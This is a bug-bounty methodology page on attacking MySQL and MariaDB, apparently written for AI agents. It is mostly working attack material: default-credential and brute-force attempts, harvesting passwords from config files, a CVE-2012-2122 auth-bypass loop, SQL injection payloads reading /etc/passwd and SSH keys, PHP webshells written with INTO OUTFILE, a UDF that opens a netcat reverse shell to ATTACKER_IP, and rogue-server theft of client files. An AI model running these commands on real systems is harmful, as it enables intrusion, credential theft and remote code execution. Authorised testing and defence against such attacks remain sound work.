---
technology: "MySQL"
kind: bug-bounty-methodology
audience: ai-agent
family: databases
version: "1.0"
source: "corpus-mined (84 writeups, pass 1 2026-11-12) + upstream-verified (MySQL/MariaDB docs, NVD, Rapid7)"
provenance: "corpus-grounded: 85 contributing writeups (internal coverage ledger, gate documented in header); upstream CVEs verified against primary sources during enrichment; basis of this page summarized from the unit ledger"
---

# MySQL bug-bounty methodology (protocol family: MySQL / MariaDB)

Companion overview: [[mysql]]; MariaDB-specific defaults: [[mysql-mariadb]].

Threat model: you enter through (a) an exposed 3306 or app SQLi, (b) a web config leak, or (c) a shell on the host. Every phase below assumes the previous one's outputs.

## Phase 0 — Fingerprint

```bash
nmap -sV -p 3306 198.51.100.x          # banner gives fork+version+distro
mysql -h 198.51.100.x -u nobody        # handshake error leaks version/client caps
```
From SQLi: `SELECT @@version, @@version_comment, @@datadir, @@basedir`.
Decision: MariaDB → file R/W odds are high (`secure_file_priv` empty default). Oracle MySQL ≥5.7 → expect `/var/lib/mysql-files` or `NULL`; plan credential attacks instead of file ops. Record the version for CVE gating (see Phase 1.3, and [[mysql-mariadb]] for divergence discipline).

## Phase 1 — Authentication attacks

**1.1 Defaults and blanks.** Try in order: `root` with no password (legacy/lazy installs), `root` with app-leaked passwords, app usernames (`drupal`, `wordpressuser`, `cactiuser`, `mmuser`, `laravel`...). CLI shape:

```bash
mysql -u root -h 198.51.100.x -p''     # blank
mysql -u root -p'P@ssw0rd!' -h 198.51.100.x
```
Local shell as root on MariaDB deb/10.4+: `sudo mysql` — unix_socket takes you in with no password at all.

**1.2 Credential sourcing (the highest-yield phase on LAMP).** Grep the host/webroot for connection strings before brute-forcing anything:

```
wp-config.php        define('DB_PASSWORD', '...');     # WordPress
.env / *.env         DB_PASSWORD=...  MYSQL_ROOT_PASSWORD=...
config.php, db.php   $dbpass / mysqli_connect(...)
~/my.cnf, /root/.my.cnf                                # password= lines
/etc/mysql/debian.cnf                                  # debian-sys-maint creds
jdbc:mysql:// / jdbc:mariadb:// URLs in app configs
docker-compose.yml / Dockerfile ENV                    # MYSQL_ROOT_PASSWORD=
```
Replay each found pair against: the DB, SSH, admin panels, other apps on the box. Password reuse across SQL↔SSH is the single most common full-compromise chain in the field.

**1.3 Version-gated bypass.** CVE-2012-2122 (MySQL 5.1.x<5.1.63 / 5.5.x<5.5.24 / 5.6.x<5.6.6; MariaDB 5.1.x<5.1.62 / 5.2.x<5.2.12 / 5.3.x<5.3.6 / 5.5.x<5.5.23; distro builds with SSE-optimized memcmp):

```bash
for i in $(seq 1 1000); do mysql -u root --password=wrong -h 198.51.100.x 2>/dev/null && break; done
```
~1/256 per attempt — a thousand iterations is near-certain. Skip on official/Oracle builds (not vulnerable).

**1.4 Hash cracking.** Dumped `mysql.user` password columns: MySQL/MariaDB native = double-SHA1, 20 bytes. Hashcat mode 300 (`mysql-sha1`) or John's `$mysqlna$` format. A captured native-password handshake (Phase 4) formats as `$mysqlna$<salt-hex>*<hash-hex>`.

## Phase 2 — Post-auth enumeration

```sql
SELECT @@version, @@secure_file_priv, @@plugin_dir, @@datadir;
SHOW VARIABLES LIKE '%plugin%';
SELECT user, host, plugin FROM mysql.user;        -- unix_socket? native? where can accounts connect from
SHOW GRANTS FOR CURRENT_USER();                   -- FILE? SUPER? GRANT?
SELECT * FROM mysql.func;                         -- UDF backdoor / prior-attacker persistence
SHOW DATABASES; USE <appdb>; SHOW TABLES;         -- hunt users/creds/sessions tables
```
Hunt order inside app DBs: `users`/`accounts` (hashes → crack → reuse), password-manager/key tables, email fields (phishing/SSO), API keys.

## Phase 3 — Filesystem via SQL (needs FILE privilege)

**3.1 Read (gate: `secure_file_priv` empty on MariaDB; jailed/NULL on MySQL ≥5.7):**

```sql
UNION SELECT 1,load_file('/etc/passwd'),3
UNION SELECT 1,load_file('/etc/nginx/sites-enabled/default'),3
UNION SELECT 1,load_file('C:/Windows/win.ini'),3          -- Windows target
```
High-value reads: app source (`/var/www/html/index.php` — usually reveals DB creds in cleartext), `~/.ssh/id_rsa`, `/proc/self/environ`, `C:/XAMPP/htdocs/...`.

**3.2 Write — webshell via `INTO OUTFILE`:**

```sql
UNION SELECT 1,'<?php system($_REQUEST["cmd"]); ?>',3 INTO OUTFILE '/var/www/html/shell.php'-- -
100 union select 1,2,'<?php phpinfo(); ?>' into outfile '/srv/app/public/test.html';-- -
test' LIMIT 1 INTO OUTFILE 'C:\\inetpub\\wwwroot\\product-453.php' LINES TERMINATED BY ...  -- Windows/IIS
```
Rules: the daemon user (`mysql`) must be able to create the file (new file only — no overwrite), the path must clear `secure_file_priv`, and the web server must serve that dir. `/var/lib/mysql` is always daemon-writable — useful when a local-file-include (`?page=/var/lib/mysql/shell`) later executes it. Base64-wrap the payload to survive quoting:

```sql
select '<?php system("echo <b64-payload>|base64 -d|bash"); ?>' INTO OUTFILE '/var/lib/mysql/shell.php';
```
**3.3 UDF command execution** (SQL root + plugin-dir write). Discover the dir, compile off-platform, ship it in via a blob table:

```bash
gcc -g -c raptor_udf2.c && gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```
```sql
CREATE TABLE foo(line blob);
INSERT INTO foo VALUES(load_file('/tmp/raptor_udf2.so'));
SELECT * FROM foo INTO DUMPFILE '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.so';  -- @@plugin_dir
CREATE FUNCTION do_system RETURNS integer SONAME 'raptor_udf2.so';
SELECT do_system('nc ATTACKER_IP 9001 -e /bin/sh');       -- runs as the mysql user
```
(mysql-user home `/var/lib/mysql` is the follow-up: drop an SSH `authorized_keys` there via `do_system`.) Reverse reading: `SELECT * FROM mysql.func` on an already-rooted box exposes attacker UDF persistence (e.g. `exec_cmd` via `libmysql.so`).

## Phase 4 — Rogue server: attack the client side

The server, not the client, chooses the file in `LOAD DATA LOCAL INFILE` (documented in the MySQL manual's "Security Considerations for LOAD DATA LOCAL"). Two operational shapes:

**4.1 Read files off a connecting client.** When an app connects to a MySQL host *you control* (SSRF-able host parameter, configurable DB host in an installer, Adminer-style universal client), run a rogue MySQL server (rogue-mysql-server / RogueSQL.py, MySQL::init) and request client-side files (`/etc/passwd`, app configs, SSH keys). Historically blocked by modern `local_infile=OFF` defaults — but the connection attempt still leaks the handshake.

**4.2 Capture and crack the auth hash.** Even a rejected login from the real client hands you the native-password scramble. Wireshark the handshake, assemble `$mysqlna$<salt-hex>*<hash-hex>`, crack with John. A web app that lets you point its DB connection at your box (e.g. an installer step, an internal API with a `host` parameter) is the trigger; force the auth plugin with `--default-auth=mysql_native_password` when the app pins it.

**4.3 Server-side LOAD DATA via a web client.** Where the app itself is the client (Adminer on the target), `LOAD DATA LOCAL INFILE '/var/www/html/index.php' INTO TABLE t FIELDS TERMINATED BY "\n"` reads files through the *web server's* privileges — bypasses PHP `open_basedir` on the SQL connection path (read `../`-relative to the app dir). Modern servers refuse unless `local_infile=ON` both sides (the "loading local data is disabled" error).

## Phase 5 — Host-side, post-shell

```
/var/lib/mysql/            datadir (offline attack if you can copy it — [[mysql-mariadb]] §2)
/var/log/mariadb/ | /var/log/mysql/    logs: queries, restarts, plugin loads
~/.mysql_history           raw SQL history (creds, tables of interest); often symlinked /dev/null
/etc/mysql/**              config tree: bind-address, plugin-load, debian.cnf
cron/backup scripts        mysqldump -u root without -p ⇒ creds in /root/.my.cnf
```

## Decision summary

| You have | Fastest path |
|---|---|
| SQLi + MariaDB banner | Phase 3.1/3.2 immediately (`secure_file_priv` empty) |
| SQLi + MySQL 8 banner | Phase 1.2-style reads of app configs via other means; cred hunt |
| Leaked web config creds | Phase 1.2 replay ladder (DB → SSH → panels) |
| Shell only | Phase 5 config/history harvest; sudo mysql on MariaDB |
| App connects to attacker-chosen DB host | Phase 4 rogue server |

## Tool map (named in prose)

nmap (version detection), the `mysql` CLI and `mysqldump`, sqlmap (`--sql-shell`, `--file-read/--file-write`), hashcat mode 300 and John the Ripper `$mysqlna$`, Hydra/medusa for TCP auth brute force, Wireshark for handshake capture, rogue-mysql-server (jib1337 fork) and RogueSQL.py, Adminer/phpMyAdmin as target-side clients, raptor_udf2 (compile with gcc), linPEAS for local privilege-escalation triage.
